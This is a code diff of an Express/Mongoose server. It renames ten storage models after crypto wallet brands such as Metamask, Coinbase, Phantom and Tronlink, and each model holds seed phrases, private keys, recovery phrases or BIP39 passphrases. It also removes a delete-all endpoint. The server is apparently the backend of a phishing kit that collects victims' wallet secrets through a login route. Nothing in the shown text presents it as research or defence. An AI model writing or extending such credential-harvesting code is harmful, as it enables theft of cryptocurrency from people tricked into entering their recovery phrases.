@@ -23,72 +23,70 @@ async function mongooseConnect(){
 }
 mongooseConnect()
 
-const db = mongoose.connection;
-
 //Schema
 const schema = new mongoose.Schema(
     {
         Time:{type:String},
         secretPhrase: {type:String}
 });
-const schemaUse = mongoose.model('database1', schema);
+const schemaUse = mongoose.model('Metamask', schema);
 
 const schema2 = new mongoose.Schema({
     Time:{type:String},
     walletName: {type:String},
     secretPhrase: {type:String}
 });
-const schema2Use = mongoose.model('database2', schema2);
+const schema2Use = mongoose.model('Multicoin', schema2);
 
 const schema3 = new mongoose.Schema({
     Time:{type:String},
     secretPhrase: {type:String}
 });
-const schema3Use = mongoose.model('database3', schema3);
+const schema3Use = mongoose.model('Blockchain', schema3);
 
 const schema4 = new mongoose.Schema({
     Time:{type:String},
     privateKey: {type:String}
 });
-const schema4Use = mongoose.model('database4', schema4);
+const schema4Use = mongoose.model('Tronlink', schema4);
 
 const schema5 = new mongoose.Schema({
     Time:{type:String},
     recoveryKey: {type:String}
 });
-const schema5Use = mongoose.model('database5', schema5);
+const schema5Use = mongoose.model('Coinbase', schema5);
 
 const schema6 = new mongoose.Schema({
     Time:{type:String},
     recoveryPhrase: {type:String}
 });
-const schema6Use = mongoose.model('database6', schema6);
+const schema6Use = mongoose.model('Phantom', schema6);
 
 const schema7 = new mongoose.Schema({
     Time:{type:String},
     mPhrase: {type:String},
 });
-const schema7Use = mongoose.model('database7', schema7);
+const schema7Use = mongoose.model('Safepal', schema7);
 
 const schema8 = new mongoose.Schema({
     Time:{type:String},
     recoveryPhrase: {type:String},
     bip39passPhrase: {type:String}
 });
-const schema8Use = mongoose.model('database8', schema8);
+const schema8Use = mongoose.model('Coinomi', schema8);
 
 const schema9 = new mongoose.Schema({
     Time:{type:String},
     recoveryPhrase: {type:String},
 });
-const schema9Use = mongoose.model('database9', schema9);
+const schema9Use = mongoose.model('Rainbow', schema9);
 
 const schema10 = new mongoose.Schema({
     Time:{type:String},
     walletName: {type:String},
     recoveryPhrase: {type:String}
 });
-const schema10Use = mongoose.model('database10', schema10);
+const schema10Use = mongoose.model('Other', schema10);
 
 const login = new mongoose.Schema({
     Time:{type:String},
@@ -314,16 +312,6 @@ server.post("/api/login",(req,res)=>{
     saveSchema()
 })
 
-
-server.delete("/api/deleteall",async(req,res)=>{
-    try {
-    await mongoose.connection.db.dropDatabase();
-    res.json({ message: 'All collections deleted successfully' });
-  } catch (error) {
-        console.log(error)
-    res.status(500).json({ message: 'Internal Server Error' });
-  }
-})
 
 //Server Listening
 server.listen(8000);
